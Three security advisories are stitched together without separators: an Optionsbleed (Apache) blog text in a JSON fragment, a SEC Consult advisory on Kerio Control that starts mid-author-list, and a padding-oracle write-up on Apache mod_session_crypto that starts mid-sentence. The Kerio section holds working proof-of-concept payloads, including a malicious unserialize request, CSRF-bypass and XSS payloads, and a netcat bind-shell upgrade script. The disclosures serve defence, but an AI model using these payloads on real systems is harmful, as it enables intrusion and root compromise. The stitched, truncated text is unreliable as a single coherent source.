            "description": "If you're using the HTTP protocol in everday Internet use you are usually only using two of its methods: GET and POST. However HTTP has a number of other methods, so I wondered what you can do with them and if there are any vulnerabilities.\r\n\r\nOne HTTP method is called OPTIONS. It simply allows asking a server which other HTTP methods it supports. The server answers with the \"Allow\" header and gives us a comma separated list of supported methods.\r\n\r\nA scan of the Alexa Top 1 Million revealed something strange: Plenty of servers sent out an \"Allow\" header with what looked like corrupted data. Some examples:\r\n```\r\nAllow: ,GET,,,POST,OPTIONS,HEAD,,\r\nAllow: POST,OPTIONS,,HEAD,:09:44 GMT\r\nAllow: GET,HEAD,OPTIONS,,HEAD,,HEAD,,HEAD,, HEAD,,HEAD,,HEAD,,HEAD,POST,,HEAD,, HEAD,!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"\r\nAllow: GET,HEAD,OPTIONS,=write HTTP/1.0,HEAD,,HEAD,POST,,HEAD,TRACE\r\n```\r\n![](https://images.seebug.org/1505800657517)\r\n\r\n\r\nThat clearly looked interesting - and dangerous. It suspiciously looked like a \"bleed\"-style bug, which has become a name for bugs where arbitrary pieces of memory are leaked to a potential attacker. However these were random servers on the Internet, so at first I didn't know what software was causing this.\r\n\r\nSometimes HTTP servers send a \"Server\" header telling the software. However one needs to be aware that the \"Server\" header can lie. It's quite common to have one HTTP server proxying another. I got all kinds of different \"Server\" headers back, but I very much suspected that these were all from the same bug.\r\n\r\nI tried to contact the affected server operators, but only one of them answered, and he was extremely reluctant to tell me anything about his setup, so that wasn't very helpful either.\r\n\r\nHowever I got one clue: Some of the corrupted headers contained strings that were clearly configuration options from Apache. It seemed quite unlikely that those would show up in the memory of other server software. But I was unable to reproduce anything alike on my own Apache servers. I also tried reading the code that put together the Allow header to see if I can find any clues, but with no success. So without knowing any details I contacted the Apache security team.\r\n\r\nFortunately Apache developer Jacob Champion digged into it and figured out what was going on: Apache supports a configuration directive Limit that allows restricting access to certain HTTP methods to a specific user. And if one sets the [Limit](https://httpd.apache.org/docs/2.4/mod/core.html#limit) directive in an .htaccess file for an HTTP method that's not globally registered in the server then the corruption happens. After that I was able to reproduce it myself. Setting a Limit directive for any invalid HTTP method in an .htaccess file caused a use after free error in the construction of the Allow header which was also [detectable with Address Sanitizer](https://blog.fuzzing-project.org/uploads/optionsbleed-asan.txt). (However ASAN doesn't work reliable due to the memory allocation abstraction done by APR.)\r\n\r\n### FAQ\r\n\r\n#### What's Optionsbleed?\r\n\r\nOptionsbleed is a use after free error in Apache HTTP that causes a corrupted Allow header to be constructed in response to HTTP OPTIONS requests. This can leak pieces of arbitrary memory from the server process that may contain secrets. The memory pieces change after multiple requests, so for a vulnerable host an arbitrary number of memory chunks can be leaked.\r\n\r\nThe bug appears if a webmaster tries to use the \"Limit\" directive with an invalid HTTP method.\r\n\r\nExample `.htaccess`:\r\n```\r\n<Limit abcxyz>\r\n</Limit>\r\n```\r\n\r\n#### How prevalent is it?\r\n\r\nScanning the Alexa Top 1 Million revealed 466 hosts with corrupted Allow headers. In theory it's possible that other server software has similar bugs. On the other hand this bug is nondeterministic, so not all vulnerable hosts may have been catched.\r\n\r\n#### So it only happens if you set a quite unusual configuration option?\r\n\r\nThere's an additional risk in shared hosting environments. The corruption is not limited to a single virtual host. One customer of a shared hosting provider could deliberately create an .htaccess file causing this corruption hoping to be able to extract secret data from other hosts on the same system.\r\n\r\n#### I can't reproduce it!\r\n\r\nDue to its nature the bug doesn't appear deterministically. It only seems to appear on busy servers. Sometimes it only appears after multiple requests.\r\n\r\n#### Does it have a CVE?\r\n\r\n[CVE-2017-9798](https://nvd.nist.gov/vuln/detail/CVE-2017-9798).\r\n\r\n#### I'm seeing Allow headers containing HEAD multiple times!\r\n\r\nThis is actually a different Apache bug ([#61207](https://bz.apache.org/bugzilla/show_bug.cgi?id=61207)) that I found during this investigation. It causes HEAD to appear three times instead of once. However it's harmless and not a security bug.\r\n\r\nLaunchpad also has [a harmless bug that produces a malformed Allow header](https://bugs.launchpad.net/launchpad/+bug/1717682), using a space-separated list instead of a comma-separated one.\r\n\r\n#### How can I test it?\r\n\r\nA simple way is to use Curl in a loop and send OPTIONS requests:\r\n```\r\nfor i in {1..100}; do curl -sI -X OPTIONS https://www.google.com/|grep -i \"allow:\"; done\r\n```\r\nDepending on the server configuration it may not answer to OPTIONS requests on some URLs. Try different paths, HTTP versus HTTPS hosts, non-www versus www etc. may lead to different results.\r\n\r\nPlease note that this bug does not show up with the \"*\" OPTIONS target, you need a specific path.\r\n\r\nHere's a [python proof of concept script](https://github.com/hannob/optionsbleed).\r\n\r\n#### What shall I do?\r\n\r\nIf you run an Apache web server you should update. Most distributions should have updated packages by now or very soon. A patch can [be found here](https://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/server/core.c?r1=1805223&r2=1807754&pathrev=1807754&view=patch). A patch for Apache 2.2 is [available here](https://blog.fuzzing-project.org/uploads/apache-2.2-optionsbleed-backport.patch) (thanks to Thomas Deutschmann for backporting it).\r\n\r\nUnfortunately the communication with the Apache security team wasn't ideal. They were unable to provide a timeline for a coordinated release with a fix, so I decided to define a disclosure date on my own without an upstream fix.\r\n\r\nIf you run an Apache web server in a shared hosting environment that allows users to create .htaccess files you should drop everything you do right now, update immediately and make sure you restart the server afterwards.\r\n\r\n#### Is this as bad as Heartbleed?\r\n\r\nNo. Although similar in nature, this bug leaks only small chunks of memory and more importantly only affects a small number of hosts by default.\r\n\r\nIt's still a pretty bad bug, particularly for shared hosting environments.",

Freingruber (Office Vienna)  \nR. Tavakoli (Office Vienna)  \nSEC Consult Vulnerability Lab  \n  \nAn integrated part of SEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nhttps://www.sec-consult.com  \n  \n=======================================================================  \n  \nVendor description:  \n-------------------  \n\"Protect your network from viruses, malware and malicious activity  \nwith Kerio Control, the easy-to-administer yet powerful all-in-one  \nsecurity solution.  \nKerio Control brings together next-generation firewall capabilities -  \nincluding a network firewall and router, intrusion detection and  \nprevention (IPS), gateway anti-virus, VPN, and web contentand  \napplication filtering. These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult.

The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability.

